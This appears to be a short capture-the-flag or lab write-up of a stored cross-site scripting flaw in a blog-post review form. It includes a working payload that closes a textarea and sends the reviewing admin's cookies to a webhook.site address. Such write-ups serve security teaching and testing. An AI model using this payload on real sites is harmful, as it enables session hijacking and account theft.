# ist193587

## Vulnerabilty

Cross-site scripting.

## Where

On the add a new blogpost for review especifically in content area

## Impact

Allows the user to execute script commands on the admin's browser in this case to get the cookies

## Steps to Reproduce

1. First I discovered where it could be executed, since the blogpost portion says that it's gonna be reviewed with them i believed that there was a big chance that what was sent is gonna be read by a admin, with this in mind i used Webhook, to have a site i could control.
2. But in this case simple past scripts didn't work. After looking at the source code when the post is under review i was able to figure out that  what was writen on the content box would all go into a textarea so even all scripts would count as strings. So what we can do is break the textarea by making a payload similar to this `content </textarea> <svg onload=window.location.replace("https://webhook.site/<random_identifier_you_were_given>?cookie="+document.cookie)>` this way we close the textarea before and what is writen after it can be executable.